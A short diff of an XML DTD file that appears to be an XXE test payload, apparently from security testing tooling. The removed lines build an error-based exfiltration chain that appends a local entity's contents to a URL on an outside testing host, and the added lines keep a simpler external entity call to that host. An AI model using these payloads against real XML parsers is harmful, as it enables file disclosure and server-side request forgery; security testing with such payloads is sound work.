@@ -1,4 +1,2 @@
-<!ENTITY % file SYSTEM "https://fake.dns.praetorianlabs.com">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'https://fake.dns.praetorianlabs.com/%file;'>">
-%eval;
-%error;
+<!ENTITY % file SYSTEM "http://fake.dns.praetorianlabs.com">
+%file;
